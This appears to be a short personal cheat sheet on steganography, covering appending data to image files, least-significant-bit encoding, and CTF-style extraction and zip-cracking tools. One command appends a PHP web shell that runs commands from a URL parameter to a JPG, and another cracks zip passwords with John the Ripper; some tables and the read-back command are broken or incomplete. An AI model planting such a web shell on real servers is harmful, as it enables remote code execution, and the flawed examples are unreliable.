# Steganography
The practice of concealing information wihtin another message or physical object in order to avoid detection.

## Hiding code in images
These techniques may be useful, but they are also very easy to detect. Altering the image file will change it's file hash as well as inflate it's size.

Appending a string to the end of an image file will allow it to still be render, but also provide a unique attack vector.
```sh
echo '<?php echo shell_exec($_GET["cmd"]);?>' >> image.jpg
```
Using the same method you can attach an entire file to the image. That can later be extracted.
```sh
cat rar.rar >> image.jpg
```

Read the file
```sh
hexdump image.jpg | tail -10 | xxd -r -p
```

## Least Significant Bit (LSB) Manipulation
Pixels in a coloured image are represented by 3 bytes (Red, Green, Blue).  The most widely used modes are:

- RGB (3x8 bit pixels, true-color)
- RGBA (4x8 bit pixels, true-color with transparency mask)

Lets take the colour:

| Hex | RGB | Binary |
| --- | --- | ------ |
| #222222 | 34,34,34 | 00100010, 00100010, 00100010 |

The LSB would look like:

| Binary | LSB |
| ------ | --- |
| 0010001 | 0 |
| 0010001 | 0 |
| 0010001 | 0 |

### Encoding Messages using the LSB
We can use the [ASCII Table](https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html) to convert our message into binary.

| Value | Decimal | Binary | 
| Hi Mom! | 72 105 32 77 111 109 33 | 

## Tools
To test a file for stenography:
```sh
binwalk filename.png
binwalk -e filename.png

steghide info filename.jpg
steghide extract -sf filename.jpg
```

If the file is a password protected zip file:
```sh
zip2john zipfile.zip > zip.hash
john zip.hash
```

Unzip file
```sh
7z e zipfile.zip
```
